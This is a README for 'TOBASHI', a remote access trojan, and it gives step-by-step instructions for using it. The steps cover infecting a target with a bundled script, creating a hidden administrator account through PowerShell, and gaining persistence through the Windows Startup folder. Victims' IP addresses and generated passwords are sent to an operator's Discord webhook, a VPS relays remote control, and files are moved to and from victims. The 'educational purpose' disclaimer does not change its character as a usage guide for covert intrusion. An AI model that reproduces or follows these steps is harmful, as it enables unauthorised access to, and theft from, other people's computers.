# TOBASHI 戸橋
TOBASHI is a RAT (Remove Access Tool) including payloads and control panel. [IN DEVELOPMENT]

## Information

This tool is for educational purpose only, the usage of TOBASHI without mutual consent is illegal. Developers assume no liability and are not responsible for any misuse or damage cause by this program.

## Features

- Remote multiple Connections
- Upload / Download files
- Local / VPS extension
- Persistence


[In development]

- Obfuscator
- Keylogger

## Configuration file

*Every target has a configuration file in .txt that will be send on your personnal discord server.* This configuration file is changing depending if you are remoting localy or outside your local network. The local file

### Example of a local configuration file :

*Here is the john local configuration file :*

```shell
Guest         # Name of the new user on the target machine (Guest by default)
192.168.0.5   # Local IP adress of the target
oUghflmDbp    # Random password generated for the connection
local         # Type of connection
```

### Example of a remote configuration file :

*Here is the doe remote configuration file :*
```shell
Guest           # Name of the new user on the target machine (Guest by default)
192.168.0.5     # Local IP adress of the target machine
oUpECuWPwL      # Random password generated for the connection
C:\Users\doe\AppData\Local\Temp   # Temp path
C:\Users\doe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\[startup].cmd    # Startup path
X.X.X.X        # VPS IP adress
2583           # Remote Port (By default)
remote         # Type of connection
```

# Installation

In order to install *TOBASHI*, please follow the steps : 

• **Git clone**

```shell
git clone https://github.com/flamendO/TOBASHI-.git
cd TOBASHI-/
python requirements.py
```

• **Start TOBASHI**

```shell
./tobashi.sh
```

# Discord configuration

In order to receive configuration files, you need to create a **discord** server. After that, create a webhook called **tobashiconsole** (the name of the salon can be different).

- To create a new discord webhook, go to your discord server settings, into *Integrations* and *Webhooks*, Then *New Webhook*.
- When you have your discord *webhook*, copy the link of your webhook and paste it in the **discord file** :

```shell
TOBASHI-/discord_config/discord
```
• When it's done, start the program, and select **discord** option, then click **Enter** to validate your discord webhook link.

# Infect in a LOCAL network

After the discord configuration set, infect your **target** with */src/initial_local.cmd*. When it's done, you should receive on your discord server a *user local configuration*, download the file and put it in the folder */users/local/*. You can now go to the program menu, select first the option **user**, choose **local** and the name of the user. **NOTE :** to choose, donc take the *.txt* at the end. For exemple, if you have a user configuration file called *john.txt*, you'll type in **user** option : *john*.

When it's done, you can go to the **console** option !


# Infect in a NON-LOCAL network

## VPS Configuration

In order to remote outside your *network*, you have to work with a **VPS**. To configure **TOBASHI** with your **VPS**, go to the start menu, and select the option **vps**.

- Follow step inside the program : write your *VPS IP*, *VPS username*, and *VPS password*.
- The program will automaticaly download features on your *VPS* server, and set the payload updated.

When it's done, you are ready to infect your target.

## Infect machine

Now, you are ready to infect, these are the same steps as for a local network. When the target opens the file, you'll receive a *user remote configuration*, that you put in the folder *users/vps/*. Then you can go to the program menu, select first the option **user**, choose **vps** and the name of the user. **NOTE :** to choose, donc take the *.txt* at the end. For exemple, if you have a user configuration file called *john.txt*, you'll type in **user** option : *john*.

When it's done, you can go to the **console** option !


# Download / Upload Option

In order to **download** or **upload** files from/to the target machine, click to the option **download** or **upload**. Follow steps. Be aware of the path of directories, use **/** and **NOT \** (question of encoding).

- **Download files** will automatically go to the folder *download_files/**target_name**/* .

# Reset settings

You might want to change your **vps or discord** settings. To do so, select the option **reset**. Then choose if you want to reset your *vps, discord* or both settings. 

# Errors that might appear

The main error that you can actually have is due your pc language. Actually in a step in the files **stage2.cmd , stage2_v.cmd**, there is this line :

```shell
Add-LocalGroupMember -Group "Administrateurs" -Member $JhfuihdfOm
```

If you are english, change **"Administrateurs"** by **"Administrators"**.





FOR VPS, INSTALL : 

sshpass
git
apache2
openssh-server

